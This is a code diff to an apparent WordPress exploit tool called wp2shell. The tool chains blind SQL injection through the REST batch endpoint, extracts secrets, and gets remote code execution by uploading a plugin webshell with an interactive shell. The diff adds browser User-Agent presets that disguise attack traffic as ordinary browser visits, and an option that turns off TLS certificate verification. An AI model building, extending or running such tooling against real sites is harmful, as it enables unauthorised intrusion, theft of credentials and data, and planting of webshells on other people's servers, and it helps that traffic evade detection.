@@ -32,6 +32,7 @@ import os
 import re
 import secrets
 import shlex
+import ssl
 import statistics
 import sys
 import time
@@ -43,9 +44,29 @@ import zipfile
 from dataclasses import dataclass
 from typing import Any, Callable, Dict, List, Optional, Tuple
 
+
+class SSLContextHandler(urllib.request.BaseHandler):
+    """Skip SSL certificate verification for self-signed / invalid certs."""
+    def https_open(self, req):
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        return self.parent.open(req, context=ctx)
+
 VERSION = "3.0"
-USER_AGENT = "wp2shell/3.0"
 TIMEOUT = 30
+
+UA_PRESETS = {
+    "default": "wp2shell/3.0",
+    "chrome":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+               "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
+    "firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) "
+               "Gecko/20100101 Firefox/127.0",
+    "safari":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
+               "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
+    "edge":    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+               "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0",
+}
 
 # wp_parse_url() returns false for any string without a host/port — this seeds
 # one WP_Error into the batch request list, desyncing $matches from $validation.
@@ -104,11 +125,15 @@ class BatchClient:
     def __init__(
         self, base_url: str, *, timeout: float = TIMEOUT,
         rest_route: bool = False, proxy: Optional[str] = None,
+        user_agent: str = "wp2shell/3.0", insecure: bool = False,
     ):
         self.base_url = base_url.rstrip("/")
         self.timeout = timeout
         self.rest_route = rest_route
+        self.user_agent = user_agent
         handlers = []
+        if insecure:
+            handlers.append(SSLContextHandler())
         if proxy:
             handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
         self._opener = urllib.request.build_opener(*handlers)
@@ -122,7 +147,7 @@ class BatchClient:
     def post(self, payload: dict, timeout: Optional[float] = None) -> Response:
         req = urllib.request.Request(
             self.endpoint, data=json.dumps(payload).encode(), method="POST",
-            headers={"Content-Type": "application/json", "User-Agent": USER_AGENT},
+            headers={"Content-Type": "application/json", "User-Agent": self.user_agent},
         )
         t = timeout or self.timeout
         start = time.monotonic()
@@ -139,7 +164,7 @@ class BatchClient:
     def get(self, path: str, timeout: Optional[float] = None) -> Response:
         url = self.base_url + (path if path.startswith("/") else f"/{path}")
         req = urllib.request.Request(url, method="GET",
-                                     headers={"User-Agent": USER_AGENT})
+                                     headers={"User-Agent": self.user_agent})
         t = timeout or self.timeout
         start = time.monotonic()
         try:
@@ -536,17 +561,20 @@ class AdminShell:
     """Authenticated admin session for plugin-upload RCE."""
 
     def __init__(self, base_url: str, *, timeout: float = 20,
-                 proxy: Optional[str] = None):
+                 proxy: Optional[str] = None, user_agent: str = "wp2shell/3.0",
+                 insecure: bool = False):
         self.base_url = base_url.rstrip("/")
         self.timeout = timeout
         self._slug = "wp2shell_" + secrets.token_hex(4)
         self._token = secrets.token_hex(16)
         self._jar = http.cookiejar.CookieJar()
         handlers = [urllib.request.HTTPCookieProcessor(self._jar)]
+        if insecure:
+            handlers.append(SSLContextHandler())
         if proxy:
             handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
         self._opener = urllib.request.build_opener(*handlers)
-        self._opener.addheaders = [("User-Agent", USER_AGENT)]
+        self._opener.addheaders = [("User-Agent", user_agent)]
 
     def login(self, username: str, password: str) -> bool:
         self._get("/wp-login.php")
@@ -745,7 +773,7 @@ def probe_685_direct(client: BatchClient, sleep: int, c: C, v: bool = False
     info(f"6.8.x direct REST API probe (author_exclude via GET)...")
 
     def _get(url, timeout):
-        rq = ur.Request(url, method="GET", headers={"User-Agent": USER_AGENT})
+        rq = ur.Request(url, method="GET", headers={"User-Agent": UA_PRESETS["default"]})
         start = time.monotonic()
         try:
             with ur.urlopen(rq, timeout=timeout) as r:
@@ -1004,8 +1032,14 @@ def _clear_progress() -> None:
 def _make_client(args: argparse.Namespace) -> BatchClient:
     return BatchClient(
         args.url, timeout=args.timeout, rest_route=args.rest_route,
-        proxy=args.proxy,
+        proxy=args.proxy, user_agent=_resolve_ua(args),
+        insecure=getattr(args, "insecure", False),
     )
+
+
+def _resolve_ua(args: argparse.Namespace) -> str:
+    ua = getattr(args, "user_agent", None) or "default"
+    return UA_PRESETS.get(ua.lower(), ua)
 
 
 def cmd_check(args: argparse.Namespace) -> int:
@@ -1181,7 +1215,9 @@ def cmd_rce(args: argparse.Namespace) -> int:
             bad("--user and --password required for plugin mode")
             return 2
         warn("Uploading plugin webshell (post-auth, needs admin credentials)")
-        session = AdminShell(args.url, timeout=args.timeout, proxy=args.proxy)
+        session = AdminShell(args.url, timeout=args.timeout, proxy=args.proxy,
+                             user_agent=_resolve_ua(args),
+                             insecure=getattr(args, "insecure", False))
         info(f"Authenticating as {args.user!r}...")
         if not session.login(args.user, args.password):
             bad("Login failed")
@@ -1288,6 +1324,10 @@ def build_parser() -> argparse.ArgumentParser:
     prb.add_argument("--rest-route", action="store_true")
     prb.add_argument("--timeout", type=float, default=30.0)
     prb.add_argument("--proxy", help="HTTP proxy")
+    prb.add_argument("-A", "--user-agent", default="default",
+                     help="UA preset: default, chrome, firefox, safari, edge, or literal")
+    prb.add_argument("-k", "--insecure", action="store_true",
+                     help="skip SSL certificate verification")
     prb.add_argument("--confirm-sqli", action="store_true",
                      help="also extract secrets via blind SQLi")
     prb.set_defaults(func=cmd_probe)
@@ -1302,6 +1342,10 @@ def build_parser() -> argparse.ArgumentParser:
                      help="use ?rest_route=/batch/v1")
     chk.add_argument("--timeout", type=float, default=30.0)
     chk.add_argument("--proxy", help="HTTP proxy")
+    chk.add_argument("-A", "--user-agent", default="default",
+                     help="UA preset: default, chrome, firefox, safari, edge, or literal")
+    chk.add_argument("-k", "--insecure", action="store_true",
+                     help="skip SSL certificate verification")
     chk.add_argument("--sleep", type=float, default=3.0,
                      help="SQL timing delay (default: 3)")
     chk.add_argument("--samples", type=int, default=3,
@@ -1320,6 +1364,10 @@ def build_parser() -> argparse.ArgumentParser:
     ext.add_argument("--rest-route", action="store_true")
     ext.add_argument("--timeout", type=float, default=30.0)
     ext.add_argument("--proxy", help="HTTP proxy")
+    ext.add_argument("-A", "--user-agent", default="default",
+                     help="UA preset: default, chrome, firefox, safari, edge, or literal")
+    ext.add_argument("-k", "--insecure", action="store_true",
+                     help="skip SSL certificate verification")
     ext.add_argument("--fast", action="store_true",
                      help="use fast X-WP-Total extraction (default: blind)")
     group = ext.add_mutually_exclusive_group()
@@ -1339,6 +1387,10 @@ def build_parser() -> argparse.ArgumentParser:
     rce.add_argument("--rest-route", action="store_true")
     rce.add_argument("--timeout", type=float, default=30.0)
     rce.add_argument("--proxy", help="HTTP proxy")
+    rce.add_argument("-A", "--user-agent", default="default",
+                     help="UA preset: default, chrome, firefox, safari, edge, or literal")
+    rce.add_argument("-k", "--insecure", action="store_true",
+                     help="skip SSL certificate verification")
     rce.add_argument("--cmd", help="command to execute")
     rce.add_argument("-i", "--interactive", action="store_true",
                      help="interactive shell")
